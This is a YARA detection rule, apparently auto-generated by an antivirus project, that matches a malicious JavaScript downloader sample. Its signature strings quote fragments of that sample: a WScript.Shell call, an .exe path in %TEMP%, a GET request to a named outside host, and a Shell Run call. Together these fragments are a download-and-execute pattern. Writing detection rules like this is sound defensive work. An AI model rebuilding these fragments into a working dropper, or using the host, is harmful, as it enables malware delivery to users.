rule sig_20160328_75254a4993cb60d32212318d2fcbbe0e {
  meta:
    description = "datamaliciousorder - file 20160328_75254a4993cb60d32212318d2fcbbe0e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54efd904836acd59fbdc74504df484b94113976d7b90b7caad907c443b128c03"

  strings:
    $s1  = "function Xulac() {return Kjhmpxnyam[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"EJ789H8qovQioh.exe\";};" fullword ascii
    $s2  = "do {WScript[Rewaptgwtg](Xzmibujye() * 11)} while (Ubltmflcb[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Nfcdhkbb(Eoehjch, Zdmvhp){return Eoehjch - Zdmvhp;};" fullword ascii
    $s4  = "var Kjhmpxnyam = function Snulr() {return WScript[Gpbdprkjs](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Ubltmflcb[Jvxacgc](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Nskowvrq() {return ((Hujjekpru == true) && (Hujjekpru == Wixvxk)) ? 1 : Vugiccqijq;};" fullword ascii
    $s7  = "function Dluqxcdhdx(Ufzpbkwv){Kjhmpxnyam[\"Run\"](Ufzpbkwv, Vugiccqijq, Vugiccqijq);};" fullword ascii
    $s8  = "var Afkannl = false;" fullword ascii
    $s9  = "function Zqqstifev(){return Dhdxnfvpg;};" fullword ascii
    $s10 = "Wixvxk = true; " fullword ascii
    $s11 = "function Tuvbtruhc()" fullword ascii
    $s12 = "var Wixvxk = false;" fullword ascii
    $s13 = "function Zcucxryyz(){return Gpbdprkjs;};" fullword ascii
    $s14 = "Hujjekpru = true; " fullword ascii
    $s15 = "function Xzmibujye(){return 22;};" fullword ascii
    $s16 = "var Oawidvz = new this[\"Date\"]();" fullword ascii
    $s17 = " while (Kxkdh){" fullword ascii
    $s18 = "return Nfcdhkbb(Igpyuxhbo, Cnhrzzxdu);" fullword ascii
    $s19 = "var Hujjekpru = false;" fullword ascii
    $s20 = "function Fesvkcobr(Jhwgyi) {var Zkykc = (1, 2, 3, 4, 5, Jhwgyi); return Zkykc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}